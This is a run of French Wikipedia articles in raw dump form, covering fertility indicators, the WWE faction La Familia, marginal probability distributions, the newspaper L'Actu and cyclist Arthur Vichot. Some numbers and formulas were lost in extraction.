Si l'homme est constamment fertile à partir de son adolescence, la femme l'est de manière cyclique. Elle l'est les derniers jours de sa phase folliculaire (juste avant l'ovulation, durant environ )), et environ après l'ovulation). La durée de vie d'un spermatozoïde est d'environ trois jours. &lt;br&gt;La « fenêtre de fertilité » se calcule en tenant compte de la durée de vie des spermatozoïdes dans la glaire cervicale et la durée de vie de l'ovule dans la trompe utérine et dure théoriquement environ .
L'ovulation est un phénomène complexe, préparé en amont par des évolutions hormonales. Il est possible, chez certaines femmes, que l'ovulation s'accompagne de la libération de plusieurs ovocytes mais toujours dans un délai de ; ce qui peut être à l'origine des faux jumeaux. Cela s'observe principalement chez des femmes sous traitement de stimulation ovarienne. Pour Maylis Jahan 
Indices de fertilité.
Les indices de fertilité sont des changements (plus ou moins discrets) que l'on peut observer dans le corps d'une femme et qui indiquent la période de son cycle menstruel où elle est la plus fertile :
L'imagerie médicale peut être utile dans le bilan de l'infertilité féminine. C'est essentiellement une imagerie non ionisante (échographie et IRM). L'hystérosalpingographie est utilisée pour en cas de problèmes de perméabilité tubaire (la « perméabilité tubaire » désigne ici la capacité des trompes de Fallope à laisser circuler l'ovocyte et les spermatozoïdes, son obstruction posant problème car empêchant leur rencontre, ce qui est une cause fréquente d’infertilité), et elle peut être complétée par un cathétérisme des trompes en cas d'obstruction tubaire proximale.
Utilisation.
La détection des indices de fertilité permet aux couples de choisir le comportement adéquat pour favoriser, ou éviter, la conception. Ces indices sont utilisés par plusieurs méthodes naturelles de régulation des naissances. Chez certains animaux, la période fertile est clairement repérable chez la femelle. Les humains font partie des quelques espèces de mammifères chez qui l'ovulation est cachée. Ainsi, la majorité des femmes ne savent pas naturellement lorsqu'elles ovulent, et cela est l'un des problèmes principaux de nombreux couples qui tentent de concevoir un enfant, la fenêtre de fertilité étant réduite.
Le centre européen de planning familial estime que l'identification des indices de fertilité augmente les chances de grossesse du couple, et peut être une méthode de contraception efficace dans certains cas. Le Bruno Scarpa promeut en particulier l'identification de la glaire cervicale « fertile ». Le Dr Fehring souligne que l'utilisateur des tests d'ovulation en combinaison avec l'observation de la glaire cervicale peut être très utile comme méthode de contraception.
Méthodes d'observation du cycle (MOC).
Les MOC utilisent signes et symptômes pour observer la fertilité. Les deux indices les plus utilisés pour détecter l'ovulation et donc la période fertile sont la température basale et l'observation de la glaire cervicale. En effet il s'agit des trois indicateurs qui varient le moins avec le stress et autres facteurs externes. Selon le Pyper, il faut mieux utiliesr plusieurs indices qu'un seul, surtout si la méthode est utilisée à des fins de régulation des naissances.
Pour détecter l'ovulation, plusieurs méthodes existent qui utilisent les indices listés plus haut :
Ces méthodes permettent l'observation de la fertilité, à la différence des "méthodes statistiques de régulation des naissances", comme la méthode du calendrier, dite Ogino-Knaus, qui calculent la probabilité de l'ovulation sur la moyenne des cycles précédents. Cette méthode est considérée maintenant comme dépassée et obsolète.
Indicateurs de la santé de la femme.
Le Vigil a montré que repérer les indices de fertilité depuis l'adolescence permet à la femme de mieux connaître son corps et donc d'identifier les déséquilibres métaboliques, endocriniens ou même des infections.
Progression de l'infertilité féminine dans le monde.
En 2025, l'infertilité féminine concerne environ un couple sur dix dans le monde. Elle a des causes multiples, parmi lesquelles les facteurs médicaux, l'âge de la première grossesse, les conditions de vies (choisies ou subies) et, de plus en plus, l'exposition constante à de nombreux polluants qui sont à l'origine d'une dégradation conjointe de la santé environnementale et de la santé reproductive. Des facteurs psychopathologiques sont discutées depuis le 19e siècle. Les perturbateurs endocriniens, très présents dans des produits de consommation courante (plastiques, cosmétiques, pesticides, retardateurs de flamme, microplastiques), sont particulièrement mis en cause car interférant directement avec la régulation hormonale qui contrôle le cycle menstruel, l'ovulation, la maturation des ovocytes et ensuite une partie de l'embryogenèse humaine, puis le déclenchement naturel de l'accouchement.
Des substances comme le bisphénol A, les phtalates, certains pesticides (atrazine, chlorpyrifos), les dioxines, les polychlorobiphényles (PCB) ou encore les composés perfluoroalkylés (PFAS) ont été associées à une diminution de la réserve ovarienne, à une altération de la qualité des ovocytes, à des troubles de l'ovulation, à des fausses couches à répétition et à des complications de grossesse telles qu'un dysfonctionnement du placenta (prééclampsie), des retards de croissance foetale, ainsi qu'à des pathologies comme l'endométriose ou l'insuffisance ovarienne précoce. Des effets épigénétiques nuisibles à l'implantation de l'embryon sont également soupçonnés (observés in vivo sur le modèle animal).
Si l'âge croissant de la maternité, et certaines maladies gynécologiques (syndrome des ovaires polykystiques, anomalies utérines, endométriose...) ou autres (ex : rhumatismes inflammatoires chroniques), ou la présence de certaines malformations ou le contexte d'une chimiothérapie expliquent une partie des cas, 10 à 25 % des infertilités restent inexpliquées selon l'Inserm ; elles pourraient être liées à l'exposition environnementale des femmes à des produits chimiques reprotoxiques, les preuves absolues étant difficiles à réunir en raison de la difficulté à mesurer l'exposition réelle et des effets combinés (effet cocktail) de dizaines de milliers de substances auxquelles les femmes sont exposées, du stade foetal à la ménopause. 
&lt;br&gt;Ceci conduit les chercheurs en santé reproductive à recommander à la fois des mesures de prévention individuelle (alimentation saine, limitation de l'usage de plastiques alimentaires, choix de cosmétiques sans perturbateurs connus, attention portée à la qualité de l'air et des produits d'entretien) et renforcer la réglementation.

</doc>
<doc id="3214616" url="https://fr.wikipedia.org/wiki?curid=3214616" title="La Familia (catch)">
La Familia (catch)

La Familia était un clan de catcheurs "heels" de la World Wrestling Entertainment commandé par Vickie Guerrero, veuve du catcheur Eddie Guerrero décédé en 2005. Ce clan comporte plusieurs membres : Chavo Guerrero, Edge, le duo Curt Hawkins et Zack Ryder et Bam Neely.
Durant la formation de "La Familia", les membres du groupe ont gagné au moins un titre en affrontant des superstars telles que : Jeff Hardy, Santino Marella, CM Punk, Kane, The Undertaker, Cherry, Ric Flair, Shawn Michaels, Triple H et Rey Mysterio, parmi d'autres. L'équipe s'est également alliée à Armando Estrada et William Regal, lorsqu'ils étaient respectivement General Manager de la ECW et de RAW, ainsi que d'autres catcheurs tels que Alicia Fox, Umaga, Vladimir Kozlov, The Great Khali et The Big Show. La Familia était responsable d'un bon nombre d'embuscades et de nombreuses blessures faites à Kofi Kingston, parmi de nombreux autres superstars, et a failli mettre un terme à la carrière de The Undertaker.
Historique.
Début (2007).
L'histoire de la Familia commence en novembre 2007 lors des Survivor Series où Batista défendait son titre contre The Undertaker dans un Hell in a Cell match. Edge effectuait son retour après plusieurs mois d'absence à la suite d'une blessure. Teddy Long annonçait un match de championnat pour ce dernier à Armageddon 2007 dans un Triple Threat match sans disqualification entre lui, Batista et l'Undertaker pour le titre de champion du monde poids lourd. Edge remportera le match et le titre.
Domination (2008).
Edge est champion du monde en poids lourds et Chavo champion de la ECW. Lors du Royal Rumble 2008 Edge affronte Rey Mysterio et conserve son titre.
Peu de temps avant No Way Out 2008, Edge demande en mariage qui accepte. Rey Mysterio arrive alors et voulant faire son West Coast Pop, Rey Mysterio le fait sur Vickie. Edge bat ensuite Rey Mysterio à No Way Out.
La Familia va ensuite connaître une rivalité avec The Undertaker. Ce dernier a obtenu son ticket pour WrestleMania XXIV et reçoit des matchs lors des shows de SmackDown plus difficiles que ceux d'Edge. Mais à WrestleMania XXIV, Edge perd son titre face à lui par soumission.
À Backlash 2008, Chavo perd contre Kane pour le titre du ECW Championship et Edge abandonne face à l'Undertaker pour le World Heavyweight champion et part sous civière.
Le à SmackDown, Vickie annonce une bataille royale à 6 hommes remportée par Edge qui devient le challenger numéro un pour Judgment Day 2008 face à l'Undertaker pour le titre vacant de World Heavyweight Champion. 
À Judgment Day, The Undertaker gagne face à Edge par décompte à l'extérieur mais la "general manager" de SmackDown annonce que la ceinture doit être gagnée par tombé ou soumission, le titre reste donc vacant.
À One Night Stand 2008, Edge remporte le TLC match face à lui ainsi que le titre grâce à l'intervention de la Familia. La stipulation du match précisait que si l'Undertaker, perdait, il devait quitter la WWE ; cette défaite met donc fin à sa carrière (kayfabe).
Le , Edge, qui venait d'être attaqué par Batista, perd face à CM Punk qui vient encaisser sa mallette remportée au Money In The Bank Ladder Match de WrestleMania XXIV pour gagner le World Heavyweight Championship, qui par la même occasion fait revenir le titre à RAW.
Rivalité entre les membres (2008-2009).
Lors du Great American Bash 2008, Edge perd face à Triple H pour le Championnat de la WWE et blesse Vickie. La semaine suivante à SmackDown, il vient lui présenter des excuses publiques et elle annonce le retour de l'Undertaker et un Hell in a Cell match entre les deux hommes à SummerSlam 2008. Les relations entre Edge et Vickie se détériorent les semaines suivantes et à SummerSlam Edge perd.
Edge revient lors des Survivor Series 2008 après avoir remplacé à la dernière minute Jeff Hardy agressé à son hôtel (kayfabe). Edge remporte le match malgré l'intervention de Jeff Hardy et remporte le WWE Championship pour la .
Lors du SmackDown du , Jeff Hardy remporte le Beat The Clock Challenge pour désigner l'adversaire d'Edge à Armageddon 2008. Lors du pay-per-view, Edge perd le Triple Threat match et le titre.
Vickie organise alors un match sans disqualification au Royal Rumble 2009 entre Jeff Hardy et son "mari", suspecté d'être responsable de l'accident de voiture et de l'incident pyrotechnique dont Hardy a été victime. Edge gagne grâce à Matt Hardy qui donne un coup de chaise à Jeff.
Vickie organise ensuite des matchs de qualification pour l'Elimination Chamber de la division SmackDown à No Way Out 2009. The Undertaker, Big Show, Triple H, Vladimir Kozlov et Jeff Hardy se qualifient.
Lors de l'évènement, Edge est éliminé par Jeff Hardy. Mais à l'Elimination Chamber match de RAW, Edge agresse Kofi Kingston pendant son entrée, remporte le match et ramène le titre World Heavyweight Championship à SmackDown. Il est le premier à participer à deux Elimination Chambers Match en une soirée et il détient le record du temps minimum entre deux ceintures de champion du monde.
Après qu'Edge a conservé sa ceinture face à John Cena, Vickie annonce que le prochain challenger pour le titre à Wrestlemania XXV est le Big Show. Mais John Cena s'interpose et finit par obtenir un match pour le titre. Lors du RAW du , il montre une vidéo où Big Show et Vickie s'embrassent.
Lors du RAW du , Vickie propose un Triple Threat match (John Cena-Edge-Big Show) à WrestleMania XXVoù le vainqueur remportera son cœur et le titre. Une bagarre éclate entre les trois hommes et Edge blesse accidentellement Vickie (kayfabe). Lors du WrestleMania 25, John Cena gagne le titre de champion du monde poids-lourds ce qui fait revenir le titre à RAW.
Au Draft de 2009, Vickie Guerrero devient la nouvelle "general manager" de RAW, le Big Show et Chavo Guerrero Jr. sont draftés à RAW laissant Edge à SmackDown. C'est la fin de l'alliance avec Edge.
Séparation (2009).
Le à RAW, Vickie Guerrero gagne le titre de Miss WrestleMania contre Santina Marella avec l'aide de William Regal et de Chavo Guerrero.
Le Chavo Guerrero et Beth Phoenix perdent un match face à Santino Marella et Mickie James. Le gagnant de ce match choisit la stipulation du match entre Vickie et Santina Marella à Extreme Rules 2009. Santino choisit un Hog Pen match, Vickie Guerrero perd le titre.
À la suite de son humiliation au Hog Pen match, Vickie Guerrero quitte ses fonctions de "general manager" de RAW et Edge demande le divorce, ce qui met officiellement fin à "La Familia".

</doc>
<doc id="3214617" url="https://fr.wikipedia.org/wiki?curid=3214617" title="Tests d’ovulation">
Tests d’ovulation



</doc>
<doc id="3214624" url="https://fr.wikipedia.org/wiki?curid=3214624" title="Loi de probabilité marginale">
Loi de probabilité marginale

En théorie des probabilités et en statistique, la loi marginale d'un vecteur aléatoire, c'est-à-dire d'une variable aléatoire à plusieurs dimensions, est la loi de probabilité d'une de ses composantes. Autrement dit, la loi marginale est une variable aléatoire obtenue par « projection » d'un vecteur contenant cette variable.
Par exemple, pour un vecteur aléatoire formula_1, la loi de la variable aléatoire formula_2 est la deuxième loi marginale du vecteur.
Définition.
Pour obtenir la loi marginale d'un vecteur, on projette la loi sur l'espace unidimensionnel de la coordonnée recherchée. La loi de probabilité de la "i"-ème coordonnée d'un vecteur aléatoire est appelée la "i"-ème loi marginale. La loi marginale formula_3 de formula_4 s'obtient par la formule : 
Soient formula_7 et formula_8 deux variables aléatoires de l'espace probabilisé formula_9 vers l'espace mesurable formula_10 et formula_11.
Les lois de probabilité marginales du vecteur aléatoire formula_12 sont les lois de probabilité de formula_7 et de formula_8. On traite ici celle de formula_7 (la méthode est la même pour celle de formula_8). D'après le théorème des probabilités totales, elle est liée à la loi de probabilité conditionnelle :
Exemples.
Loi discrète.
Si formula_8 est une variable aléatoire discrète à valeurs dans un ensemble dénombrable formula_19, alors :
C'est notamment le cas quand formula_21 est fini. En notant formula_22 ses valeurs et formula_23 les probabilités formula_24, la loi de probabilité devient :
Le tableau suivant donne un exemple. On a marqué les probabilités que X = xi et Y = yj. La loi marginale pour X donne les probabilités que X = xi. Elle est donnée sur la dernière ligne. Par exemple, la probabilité que X = x1 est obtenue en sommant les probabilités d'avoir X = x1 et Y = y1, X = x1 et Y = y2, et X = x1 et Y = y3. Ainsi, on a = ++. De même, la loi marginale pour Y est donné dans la dernière colonne.
Loi absolument continue.
Les lois marginales d'une loi absolument continue s'expriment à l'aide de leurs densités marginales par les formules :
où formula_27 est la densité de probabilité du vecteur formula_28.
De manière plus générale, si formula_7 et formula_8 sont des variables aléatoires absolument continues, de densité de probabilité conjointe formula_31 par rapport à une mesure formula_32-finie formula_33 sur formula_10, alors :

</doc>
<doc id="3214628" url="https://fr.wikipedia.org/wiki?curid=3214628" title="L'Actu">
L'Actu

L'Actu est un journal quasi quotidien qui paraît du lundi puis du mardi au samedi et est destiné aux adolescents dès 13 ans. Il comprend huit pages pour « 10 minutes de lecture par jour ». "L'Actu" est édité aux éditions Play Bac, qui publient aussi "Le Petit Quotidien" pour les 6-10 ans et "Mon quotidien" pour les 10-13 ans. Le , il passe au format baptisé quoti-hebdo, avec une édition papier chaque vendredi et le reste exclusivement numérique.
Présentation.
Il informe ses lecteurs de l'actualité en France et dans le monde. Construit en huit pages, ce journal traite des événements qui se sont passés chaque jour.
Le journal se revendique « 100% faits, 0% opinions », cela signifie que "L'Actu" ne donne pas son point de vue : il veille à rester neutre et impartial sans donner son avis, son opinion. Il ne transmet donc que les faits, c'est-à-dire qu'ils sont prouvables et incontestables. Même dans ses unes débat (ex. : « Pour ou contre le droit du sol? »), "L’Actu" reste impartial en mettant les opinions « pour » face aux opinions « contre ».
Fin 2007, la mise en page du journal est changée, dans le but de l'aérer et de mettre l'actualité en avant. Pour cela, le rédacteur en chef de "L'Actu", François Dufour, fait appel aux services de Jeff Mignon, un designer de presse.
À partir de juin 2009, le quotidien est également publié le lundi sous forme d'un journal entièrement constitué de photos qui retracent l'actualité. Ce numéro « spécial photos » remplace ainsi « les meilleures photos du mois » et ce changement augmente légèrement le prix de l'abonnement. Cette édition du lundi est finalement supprimée.
Le journal a ouvert un site en août 2014 qui propose de lire les archives du quotidien en format pdf ainsi que des rubriques thématiques.
À partir du mardi 7 juillet 2015, une nouvelle maquette plus épurée est adoptée, avec comme couleur majeure le bleu.
"L'Actu" peut contenir de la communication sponsorisée, selon la politique éditoriale de sa maison d'édition.
Publications dérivées.
Les dossiers de "L'Actu".
Les dossiers de "L'Actu" sont des compléments de 4 pages que les lecteurs reçoivent le lundi en général qui sont classés en séries comme :
Numéros spécial photos.
Les numéros spécial photos paraissaient tous les lundis et sont compris dans l'abonnement à "L'Actu". Composés de « 12 pages tous en images », ils montrent l'actualité par les photos ou sont construits sur un thème commun à toutes les images (série policières américaines...).
Le lundi 13 avril 2015, le numéro spécial photos, qui sera finalement supprimé, est réduit à 8 pages avec des photos en format paysage.
"My weekly".
Il est désormais possible de rajouter à son abonnement à "l'Actu" un journal de 4 pages entièrement en anglais publié tous les mercredis : "My Weekly". Il traite de l'actualité mondiale en anglais. Une version audio de cet hebdomadaire est disponible sur Internet pour les abonnés à ce journal. Pour aider le lecteur, un dictionnaire de vocabulaire et de verbes est présent en page 4.
"Meine Woche".
Il est aussi possible de s'abonner à un journal de 4 pages entièrement en allemand : "Meine Woche". Pour aider le lecteur, un dictionnaire de vocabulaire et de verbes est présent en page 4. Ce journal paraît le vendredi.
"Mi Semanal".
Il est également possible de s'abonner à un journal de 4 pages entièrement en espagnol : "Mi Semanal". Pour aider le lecteur, un dictionnaire de vocabulaire et un de verbes est présent en page 4. Ce journal paraît le vendredi.
"L'éco".
Les lecteurs (de façon indépendante) peuvent aussi s'abonner à "L'Éco" qui est un journal hebdomadaire publié le vendredi. Construit en huit pages, il entend informer ses lecteurs de l'actualité économique dans le monde. Il contient des graphiques, dictionnaire économique, comparaison de prix... Il s'adresse aux débutants en économie.
Numéros spéciaux.
Play Bac édite depuis 2006 des numéros spéciaux qui sortent en kiosques : 
Ces numéros spéciaux en kiosque sont composés d'articles détaillés et de quiz sur les informations du magazine.
Résultats financiers.
La société Play Bac Presse a réalisé en 2017 un chiffre d'affaires de 16 267 500 € et dégagé un résultat positif de 433 000 € avec un effectif de 14 personnes.

</doc>
<doc id="3214629" url="https://fr.wikipedia.org/wiki?curid=3214629" title="Serra dos Carajas">
Serra dos Carajas



</doc>
<doc id="3214631" url="https://fr.wikipedia.org/wiki?curid=3214631" title="GP Guillaume Tell">
GP Guillaume Tell



</doc>
<doc id="3214632" url="https://fr.wikipedia.org/wiki?curid=3214632" title="Arthur Vichot">
Arthur Vichot

Arthur Vichot, né le à Colombier-Fontaine (Doubs), est un coureur cycliste français professionnel de 2010 à 2020.
Passé professionnel en 2010 au sein de l'équipe La Française des jeux, Arthur Vichot a un profil de puncheur à l'aise sur des courses vallonnées. Double champion de France sur route en 2013 et 2016, il a également terminé troisième de Paris-Nice en 2014, compte plusieurs places d'honneur sur des courses d'un jour de l'UCI World Tour et est codétenteur du record de victoires sur le Tour du Haut-Var. Il rejoint en 2019 la formation Vital Concept-B&amp;B Hotels.
Régulièrement, Vichot se blesse et tombe malade au cours de sa carrière. Atteint d'un syndrome de surentraînement diagnostiqué en 2020, n'ayant pas la perspective de récupérer son niveau sportif antérieur et étant en fin de contrat, il arrête sa carrière à l'issue de cette saison.
Repères biographiques et carrière en amateur.
Arthur Vichot naît le à Colombier-Fontaine dans le Doubs. Il est membre d'une famille liée au sport cycliste. Son père, Max Vichot, a été coureur amateur au CC Étupes et dirige une entreprise de fabrication de roues de vélo qu'il a fondée. Frédéric Vichot, professionnel au cours des années 1980 et lauréat de trois étapes sur les grands tours, est le cousin de Max.
Dans sa jeunesse, Arthur Vichot pratique initialement le football dans le club de sa commune, l'US Colombier-Fontaine, à partir de l'âge de 8 ans. Il est supporter du Borussia Dortmund et surtout du club de sa région, le FC Sochaux-Montbéliard. Il apprécie également la NBA. Il suit cependant son père qui reprend la compétition cycliste en amateur et intègre en juniors le club où il s'est engagé, le CR4C Roanne à partir de 2007. En parallèle, il ambitionne de devenir éducateur sportif auprès de personnes handicapées et obtient pour cela une licence en STAPS. Il court initialement à l'échelon départemental avant d'évoluer. En 2008, il remporte tout d'abord en avril le Tour du Charolais. Vichot se met ensuite en évidence à plusieurs reprises lors du mois d'août. Tout d'abord lauréat du Circuit des Deux Provinces au niveau national, il intègre la semaine suivante l'équipe de France espoirs appelée à disputer le Grand Prix Guillaume Tell. Il s'impose lors de la deuxième étape de cette course de niveau Continental et termine quinzième au classement final de la course. Il termine ce mois par une deuxième place lors du championnat de France sur route espoirs. Le mois suivant, il est quatrième du Tour du Gévaudan puis il se casse une clavicule au cours du Grand Prix de la Somme, ce qui l'amène à devoir renoncer aux championnats du monde espoirs. Ces résultats lui permettent d'être suivi par les équipes professionnelles AG2R La Mondiale, Cofidis et Auber 93. À l'issue de la saison, le CR4C Roanne remporte la Coupe de France des clubs DN1, Vichot ayant contribué significativement à cette victoire grâce à ses performances. Il considère sur cette saison avoir non seulement progressé dans ses résultats mais également sur son entraînement et sa nutrition.
L'année suivante, toujours dans la même équipe et régulièrement sélectionné en équipe de France espoirs, Vichot ajoute trois victoires à son palmarès en gagnant la quatrième étape du Circuit de Saône-et-Loire, le Tour du Haut-Berry et le Grand Prix de Chardonnay. Il se classe également troisième du Circuit des Ardennes et deuxième du championnat de France sur route amateurs. En sélection nationale espoirs, il termine de la course en ligne des Jeux méditerranéens. Il aide Romain Sicard à remporter le Tour de l'Avenir puis fait partie de l'équipe de France lors des championnats du monde espoirs de Mendrisio. Participant à la course en ligne, il temine d'une course remportée à nouveau par Sicard. Lié à l'équipe professionnelle La Française des jeux dont il est membre de la fondation, il ne la rejoint pas en cours de saison en tant que stagiaire pour se focaliser sur les épreuves disputées en sélection espoirs. Il est cependant suivi par un des entraîneurs de l'équipe, Jacques Decrion. En août, son passage en professionnel pour la saison 2010 est annoncé au sein de cette formation. Il y signe un contrat portant sur deux saisons.
Carrière professionnelle.
FDJ (2010-2018).
Premières victoires (2010-2011).
Pour sa première course professionnelle en janvier 2010, le Tour Down Under, Arthur Vichot est choisi par un groupe de fans australiens de cyclisme pour une campagne de buzz. Il atteint à plusieurs reprises le top 10 des courses auxquelles il participe. Lors de Paris-Corrèze, il obtient sa première victoire professionnelle en remportant la deuxième étape devant Jonathan Hivert et son coéquipier Gianni Meersman. Vichot participe ensuite à son premier grand tour en Espagne dans lequel il abandonne lors de la quinzième étape en raison d'une gêne à un genou. Cette première saison en professionnel est qualifiée de par l'entraîneur de la FDJ Frédéric Grappe.
Vichot commence la saison 2011 en se classant fin janvier cinquième de la première manche de la Coupe de France, le Grand Prix d'ouverture La Marseillaise. Le mois suivant, il est neuvième de l'Étoile de Bessèges puis remporte devant Thierry Hupond et Cyril Gautier les Boucles du Sud Ardèche ce qui lui permet d'être sélectionné pour Paris-Nice. Dans une chute lors de Paris-Nice, il se fissure une clavicule, ce qui l'empêche de participer aux classiques ardennaises. Deuxième en juin d'une étape du Tour de Luxembourg, il est sélectionné sur le Tour de France. Ayant pour meilleur résultat une sixième place lors de la sixième étape, il se classe de cette « Grande Boucle ». Début septembre, Vichot s'impose dans sa région en solitaire lors du Tour du Doubs avec 16 secondes d'avance sur ses poursuivants. Une semaine plus tard, il est huitième du Grand Prix cycliste de Montréal, ce qui constitue son premier top 10 sur une course d'un jour de l'UCI World Tour. Vichot conclut sa saison par un abandon lors du Tour de Lombardie.
Première victoire sur le World Tour (2012).
Pour 2012, Vichot a comme objectifs de bien figurer sur Tirreno-Adriatico ainsi que sur les classiques ardennaises et les courses à étapes du mois d'avril. Comme en 2011, Vichot obtient une place d'honneur lors de sa course de rentrée 2012 en se classant troisième du Grand Prix d'ouverture La Marseillaise. Victime d'une chute lors de l'Étoile de Bessèges, Vichot est écarté des compétitions durant trois semaines en raison d'une fracture à une clavicule. Faisant son retour à l'occasion des Boucles du Sud Ardèche où il est tenant du titre, Vichot s'y classe deuxième à 31 secondes de son équipier Rémi Pauriol. de Tirreno-Adriatico, il obtient en avril une cinquième place sur la première étape du Tour du Pays basque puis obtient son meilleur classement des Ardennaises lors de Liège-Bastogne-Liège (). Lors du Critérium du Dauphiné qui se dispute en juin, il figure dans une échappée au cours de la cinquième étape qui comporte l'ascension de plusieurs difficultés dont le col du Grand Colombier. Une attaque dans les derniers kilomètres de l'étape permet à Vichot de s'imposer en solitaire et d'obtenir ainsi sa première victoire dans le calendrier World Tour.
Vichot dispute ensuite en juillet le Tour de France. Initialement présélectionné par Laurent Jalabert pour la course en ligne des Jeux olympiques de 2012, Vichot apprend pendant la Grande Boucle qu'il ne fait pas partie des quatre Français retenus pour disputer la course mais il est néanmoins retenu comme remplaçant. En septembre, il est seizième du Grand Prix cycliste de Québec puis treizième du Grand Prix cycliste de Montréal. Il fait partie de la sélection des neuf coureurs français participant à la course en ligne des championnats du monde, avec pour leader Thomas Voeckler. Vichot ne finit pas cette course où Voeckler est septième.
Champion de France sur route (2013).
Arthur Vichot commence l'année 2013 en obtenant la douzième place du Grand Prix d'ouverture La Marseillaise. Neuvième de l'Étoile de Bessèges puis dixième du Tour méditerranéen, Vichot obtient sa première victoire en remportant le classement général du Tour du Haut-Var. Alors à égalité de temps avec les Néerlandais Lars Boom et Laurens ten Dam à l'issue des deux étapes, Vichot s'impose en raison d'une meilleure addition des places obtenues sur chaque arrivée. En avril, il est malade sur le Tour du Pays basque qu'il ne termine pas. Dix-huitième ensuite de la Flèche wallonne, il est une nouvelle fois diminué lors de Liège-Bastogne-Liège où il se classe quarantième. Après le Tour de Romandie, Vichot stoppe sa première partie de saison. Pour sa reprise, à la fin du mois de mai, il obtient la quatrième place du Grand Prix de Plumelec-Morbihan.
Lors du championnat de France à Lannilis, il s'échappe après cinq kilomètres en compagnie de 10 autres coureurs. Dans l'avant-dernier tour, il s'isole seul en tête de la course. À l'amorce du dernier tour il se fait rejoindre par Sylvain Chavanel et Tony Gallopin, puis accélère à moins de deux kilomètres de l'arrivée et parvient à résister au retour de Chavanel pour s'imposer en réalisant l'exploit d'avoir été en tête de course pendant . Au palmarès, il succède ainsi à son coéquipier Nacer Bouhanni. Cette victoire lui permet d'obtenir sa sélection pour le Tour de France où il est coéquipier de Thibaut Pinot. Ce dernier perd toute chance au classement général lors des étapes pyrénéennes et permet à Vichot de se concentrer sur certaines étapes. Échappé durant la quatorzième étape, il est ainsi huitième à l'arrivée. Il chute dans la descente du col de la Madeleine en dernière semaine mais conclut ce Tour de France en . Après ce Tour, il ne peut participer à la Classique de Saint-Sébastien à cause des séquelles de sa chute en montagne et revient en compétition lors du Tour du Limousin. Il vise ensuite les courses d'un jour du mois de septembre. Deuxième de la cinquième étape du Tour du Poitou-Charentes en août derrière le champion d'Espagne sur route Jesús Herrada, Vichot obtient en septembre la deuxième place du Grand Prix cycliste de Québec derrière Robert Gesink puis la onzième du Grand Prix cycliste de Montréal. Sélectionné ensuite pour la course en ligne des championnats du monde de Florence, Vichot termine dix-huitième et premier Français. Une semaine plus tard, il est présent lors du Tour de Lombardie en soutien de Pinot. Son année se conclut sur un abandon.
Podiums à Paris-Nice et à Plouay (2014).
Arthur Vichot aborde 2014 avec plus d'ambition et des objectifs portant sur Milan-San Remo et les classiques ardennaises au sein d'une équipe FDJ.fr ayant une volonté de s'impliquer davantage sur ces épreuves d'avril. Vichot souhaite également gagner une course tant qu'il a le maillot de champion de France. Il commence sa saison par le Grand Prix d'ouverture La Marseillaise qu'il termine en cinquième position. Également cinquième de l'Étoile de Bessèges, Vichot est le chef de file de son équipe sur un Paris-Nice moins pentu qu'habituellement. Après plusieurs places d'honneur d'étapes et une place dans les dix premiers, Vichot remporte la dernière étape à Nice et prend la troisième place du classement final grâce aux bonifications acquises par sa victoire d'étape. Il ne termine pas Milan-San Remo la semaine suivante. Après cette épreuve italienne, Vichot doit abandonner le Tour du Pays basque le 9 avril à cause de douleurs au genou droit. Ces douleurs, dont l'origine se révèle être un syndrome rotulien, persistent ensuite et obligent le Français à renoncer aux classiques ardennaises. Après un stage dans les Pyrénées dans l'optique du Tour de France, il reprend la compétition à la fin du mois de mai au Tour de Bavière. Il poursuit sa saison avec difficulté, contraint à l'abandon lors de la treizième étape du Tour de France du fait d'une angine ou d'une trachéite, alors qu'il pointait à la du classement général.
Vichot se fixe comme objectif suivant la course en ligne des championnats du monde. De retour au Tour du Limousin en août, il y obtient trois places dans les dix premiers d'étapes et la huitième place au classement général. Vichot conclut ce mois par le Grand Prix de Plouay : figurant dans le groupe de sept coureurs qui se disputent la victoire, Vichot est dominé au sprint par Sylvain Chavanel et Andrea Fedi. Il est ensuite chef de file de son équipe pour les Grands Prix de Québec et de Montréal. À Québec, la course se termine par un sprint et il chute à cette occasion. Atteint d'une quadruple fracture de la clavicule droite, sa blessure nécessite une intervention chirurgicale. Il ne peut donc participer aux championnats du monde et est contraint de mettre un terme à sa saison.
Saison gênée par un virus (2015).
Arthur Vichot vise principalement les classiques ardennaises pour cette saison qu'il commence lors du Grand Prix d'ouverture La Marseillaise le février. Après des courses en Espagne en février, Vichot dispute Paris-Nice en mars. À la suite de son podium en 2014, il vise une place dans les dix premiers de la course sur un tracé moins favorable à son profil. Il n'atteint pas cet objectif, se classant douzième du classement général. En avril, avant les classiques ardennaises, il est huitième du Circuit de la Sarthe. Sur ces classiques ardennaises, il est de l'Amstel Gold Race, de la Flèche wallonne et abandonne lors de Liège-Bastogne-Liège. En mauvaise condition physique, il ne termine pas la semaine suivante le Tour de Romandie. Absent durant plusieurs semaines de la compétition, il apprend alors que ses mauvaises performances sont dues à un cytomégalovirus. et avant-dernier du Tour de Suisse pour sa reprise où il a évolué comme coéquipier de Thibaut Pinot en tête de l'épreuve pendant plusieurs jours, il ne figure pas dans la sélection pour le Tour de France.
Après des vacances, il effectue son retour au Tour de Wallonie où il est notamment cinquième de la troisième étape&lt;ref name="est 09/09/2015"&gt;.&lt;/ref&gt;. Après le Tour du Limousin et le Tour du Poitou-Charentes, il participe au Grand Prix de Plouay puis aux Grands Prix de Québec et Montréal, où il déclare ne pas avoir du fait d'une condition physique toujours pas optimale. Dix-huitième à Québec, il est ensuite à son retour en Europe septième du Grand Prix de Wallonie. Vichot termine sa saison par un abandon au Tour de Lombardie que Pinot termine troisième. Cette saison perturbée par le virus du printemps marque pour Vichot un par rapport à l'année précédente. Il déclare avoir envisagé de remettre en question sa carrière de coureur&lt;ref name="le télégramme 27/05/16"&gt;.&lt;/ref&gt;.
Deuxième titre national (2016).
